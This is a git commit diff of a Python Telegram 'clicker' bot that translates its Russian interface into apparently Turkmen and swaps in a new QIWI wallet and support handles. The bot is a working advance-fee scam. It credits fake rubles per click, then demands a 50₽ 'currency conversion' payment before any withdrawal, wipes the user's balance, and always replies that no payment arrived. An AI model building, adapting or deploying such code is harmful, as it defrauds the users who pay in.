9d4674a736592280b9c4a32cdab31082b61a7613
Kerim <97771265+Kerimbula@users.noreply.github.com>
2022-01-20 22:29:51 +0300

    Update clicks.py

--- clicks.py
+++ clicks.py
@@ -15,10 +15,10 @@ dp = Dispatcher(bot)
 @dp.message_handler(commands=['start'])
 async def start(m: types.Message):
     startbtn = ReplyKeyboardMarkup(resize_keyboard=True)
-    btn1 = KeyboardButton(text="💎Клик")
-    btn2 = KeyboardButton(text="👤Профиль")
-    btn3 = KeyboardButton(text="🌐Поддержка")
-    btn4 = KeyboardButton(text="📚О боте")
+    btn1 = KeyboardButton(text="💎Click")
+    btn2 = KeyboardButton(text="👤Profil")
+    btn3 = KeyboardButton(text="🌐Admin")
+    btn4 = KeyboardButton(text="📚Bot info")
     startbtn.add(btn1)
     startbtn.add(btn2, btn3)
     startbtn.add(btn4)
@@ -37,12 +37,12 @@ async def start(m: types.Message):
     data = db.fetchone()
     if data is None:
         dr = datetime.now().date()
-        await m.answer(f'<b>Приветствую {m.from_user.first_name}!</b>', reply_markup=startbtn)
+        await m.answer(f'<b>Salam! {m.from_user.first_name}!</b>', reply_markup=startbtn)
         await bot.send_message(1004250581, f"#новый_пользователь\nНик: <a href='tg://user?id={m.from_user.id}'>{m.from_user.first_name}</a>\nИд: <code>{m.from_user.id}</code>")
         db.execute(f"INSERT INTO user VALUES (?, ?, ?, ?, ?, ?)", (m.from_user.id, 0, "не подтверждён", dr, 0, 0))
         connection.commit()
     else:
-        await m.answer("<b>Опять? продолжай зарабатывать!</b>", reply_markup=startbtn)
+        await m.answer("<b>Yene? Pul ishle!</b>", reply_markup=startbtn)
        
 @dp.message_handler(content_types=['text'])
 async def texts(m: types.Message):
@@ -50,7 +50,7 @@ async def texts(m: types.Message):
     db = connection.cursor()
     db.execute("SELECT * FROM user WHERE id = (?)", (m.from_user.id, ))
     data = db.fetchone()
-    if m.text == '👤Профиль':
+    if m.text == '👤Profil':
         un = m.from_user.username
         pr = un[:5]
         if un != '':
@@ -58,17 +58,17 @@ async def texts(m: types.Message):
         else:
             username = m.from_user.first_name
         vivod = InlineKeyboardMarkup()
-        v = KeyboardButton(text="💰Вывести", callback_data="vivod")
+        v = KeyboardButton(text="💰Chykarmak", callback_data="vivod")
         vivod.add(v)
-        await m.answer(f"<b>Ваш профиль:</b>\n\n⭐Ваш ник: {username}\n⭐Ваш id: {m.from_user.id}\n⭐Баланс: {data[1]}\n⭐Заработано: {data[4]}\n⭐Дата регистрации: {data[3]}", reply_markup=vivod)
-    if m.text == '🌐Поддержка':
+        await m.answer(f"<b>Sizin profiliniz:</b>\n\n⭐Sizin nikynyz: {username}\n⭐Sizin idnyz: {m.from_user.id}\n⭐Balansynyz: {data[1]}\n⭐Ishlediniz: {data[4]}\n⭐Hachan geleniniz: {data[3]}", reply_markup=vivod)
+    if m.text == '🌐Tex Komek':
         s = m.text
-        if s == '🌐Поддержка':
+        if s == '🌐Tex Komek':
             ad = InlineKeyboardMarkup()
-            a = KeyboardButton(text="Написать", url="https://pamparampam")
+            a = KeyboardButton(text="Yazmak", url="https://t.me/CulerVPN")
             ad.add(a)
-            await m.answer("👇Нажмите на кнопку ниже чтобф написать алминистации", reply_markup=ad) 
-    elif m.text == '📚О боте':
+            await m.answer("👇Knopka bas admina yazmak uchin", reply_markup=ad) 
+    elif m.text == '📚Bot info':
         brnow = datetime.now().date()
         conn = sqlite3.connect('user.db')
         sql = conn.cursor()
@@ -84,10 +84,10 @@ async def texts(m: types.Message):
         sq = conn.cursor()
         sq.execute("SELECT * FROM user WHERE id = (?)", (1004250581, ))
         ro = sq.fetchone()
-        await m.answer(f"<b>Информация о боте:</b>\n\n🔻Всего пользователей: {len(row1)}\n🔻Новых за сегодня: {len(row)}\n🔻Выплачено: {ro[5]}\n🔹Бот создан: 2021-10-22")
+        await m.answer(f"<b>BOT info:</b>\n\n🔻Nache adam: {len(row1)}\n🔻Taze shugun gunli: {len(row)}\n🔻Pul chikarylan: {ro[5]}\n🔹Bot yasalan: 2022-01-20")
         
     elif m.text == '💎Клик':
-        await m.answer("Вы кликнули, и получили 1₽ на баланс! 🤑")
+        await m.answer("Siz bastynyz, we ishledniz 1₽ balansa! 🤑")
         db.execute(f"Update user set money={data[1]} + 1 WHERE id = (?)", (m.from_user.id, ))
         db.execute(f"Update user set zall={data[4]} + 1 WHERE id = (?)", (m.from_user.id, ))
         connection.commit()
@@ -100,21 +100,21 @@ async def call(c: types.CallbackQuery):
     data = db.fetchone()
     if c.data == 'vivod':
         if data[1] < 500:
-            await c.answer("Минимальная сумма вывода 500₽!", show_alert=True)
+            await c.answer("Minimalno chykaryp bolya 500₽!", show_alert=True)
         else:
             await c.message.delete()
             lox = InlineKeyboardMarkup()
-            ya = KeyboardButton(text="💰ОПЛАТИТЬ💰", url="https://qiwi.com/n/ATTLE379")
-            ty = KeyboardButton(text="✅Проверить", callback_data="hahaha")
+            ya = KeyboardButton(text="💰OPLATIT💰", url="https://qiwi.com/n/WERAS")
+            ty = KeyboardButton(text="✅Prowerit", callback_data="hahaha")
             lox.add(ya)
             lox.add(ty)
-            await c.message.answer(f"<b>Остался последний шаг!\nДля получения перевода нужно перевести 50₽ на наш киви кошелек для конвертанции валют!\nВаши деньги сразу же прийдут назад!</b>\n\n<b>ОБЯЗАТЕЛЬНО!!!\nВ коментарие к переводу укадите ваш ид (<code>{c.from_user.id}</code>)!</b>", reply_markup=lox)
+            await c.message.answer(f"<b>In posledny ish ba!\nPul almak uchin 50 rubl oklamaly, biz konwertasiya walyut edyas!\nSizin pullarynyz izine gelya!</b>\n\n<b>ОБЯЗАТЕЛЬНО!!!\nВ коментарие к переводу укадите ваш ид (<code>{c.from_user.id}</code>)!</b>", reply_markup=lox)
             db.execute(f"Update user set money={data[1]} - {data[1]} WHERE id = (?)", (c.from_user.id, ))
             db.execute(f"Update user set vall={data[5]} + {data[1]} WHERE id = (?)", (1004250581, ))
             connection.commit()
            
     elif c.data == 'hahaha':
-        await c.answer("Оплата не обнаружена! Если вы оплатили, напишите администрации: @pramparapam", show_alert=True)
+        await c.answer("Pul gelenok! Siz pul oklasanyz admina yazyn: @VulerVPN", show_alert=True)
        
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
